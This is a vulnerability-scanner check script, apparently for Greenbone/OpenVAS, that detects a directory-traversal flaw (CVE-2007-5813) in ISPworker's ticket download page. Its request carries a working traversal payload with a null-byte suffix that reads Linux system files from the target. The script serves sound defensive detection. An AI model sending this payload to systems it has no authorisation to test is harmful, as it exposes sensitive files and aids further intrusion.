if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.100370" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2009-12-02 17:30:58 +0100 (Wed, 02 Dec 2009)" );
	script_bugtraq_id( 26277 );
	script_cve_id( "CVE-2007-5813" );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:N/A:N" );
	script_name( "ISPworker Download.PHP Multiple Directory Traversal Vulnerabilities" );
	script_category( ACT_ATTACK );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2009 Greenbone Networks GmbH" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "os_detection.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_require_keys( "Host/runs_unixoide" );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "summary", value: "ISPworker is prone to multiple directory-traversal vulnerabilities
  because it fails to sufficiently sanitize user-supplied input." );
	script_tag( name: "impact", value: "Exploiting these issues may allow an attacker to obtain sensitive
  information that could aid in further attacks." );
	script_tag( name: "affected", value: "These issues affect ISPworker 1.21 and 1.23. Other versions may also
  be affected." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "solution", value: "No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective features,
  remove the product or replace the product by another one." );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/26277" );
	exit( 0 );
}
require("host_details.inc.sc");
require("os_func.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
require("misc_func.inc.sc");
port = http_get_port( default: 80 );
if(!http_can_host_php( port: port )){
	exit( 0 );
}
files = traversal_files( "linux" );
for dir in nasl_make_list_unique( "/ispworker", http_cgi_dirs( port: port ) ) {
	if(dir == "/"){
		dir = "";
	}
	url = NASLString( dir, "/module/biz/index.php" );
	req = http_get( item: url, port: port );
	buf = http_keepalive_send_recv( port: port, data: req, bodyonly: FALSE );
	if(!buf){
		continue;
	}
	if(egrep( pattern: "Login - ISPworker", string: buf, icase: TRUE ) && egrep( pattern: "start_authentication", string: buf, icase: TRUE )){
		for pattern in keys( files ) {
			file = files[pattern];
			url = NASLString( dir, "/module/ticket/download.php?ticketid=../../../../../../../../../" + file + "%00" );
			if(http_vuln_check( port: port, url: url, pattern: pattern )){
				report = http_report_vuln_url( port: port, url: url );
				security_message( port: port, data: report );
				exit( 0 );
			}
		}
	}
}
exit( 99 );

